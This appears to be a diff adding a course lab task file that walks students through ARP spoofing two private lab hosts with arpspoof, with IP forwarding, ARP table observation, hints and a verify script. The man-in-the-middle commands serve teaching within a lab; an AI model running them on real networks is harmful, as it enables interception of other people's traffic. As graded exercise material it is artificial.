@@ -1,0 +1,22 @@
+id: "02"
+title: "ARP spoof the lab (and see it)"
+prompt: |
+  Position yourself between two lab machines.
+
+  1. Enable IP forwarding: sudo sysctl -w net.ipv4.ip_forward=1
+  2. Run arpspoof (dsniff package) against two public lab hosts, e.g.:
+     sudo arpspoof -i <your-docker-interface> -t 172.16.10.11 172.16.10.10
+     (run 30 seconds, then Ctrl+C)
+  3. Save the output to ~/kali-class-work/sec-wk11/arpspoof.txt
+  4. In a second terminal, watch the ARP tables change:
+     arping -I <iface> 172.16.10.11 or ip neigh — save to
+     ~/kali-class-work/sec-wk11/arp-table.txt
+  5. Stamp: kali-class stamp sec-wk11 arpspoof
+hints:
+  - "Your docker interface: ip addr | grep -A2 docker (or ip -br a). Commonly docker0 or br-xxxx."
+  - "arpspoof tells 172.16.10.11 that YOU are 172.16.10.10 — repeat the swap to poison both ways."
+  - "Ctrl+C stops it; restore normal state with the same command minus the spoofing."
+verify:
+  script: "02-arpspoof.verify.sh"
+  timeout: 90
+on_success: "You injected yourself into an ARP flow. The network's trust model, abused."
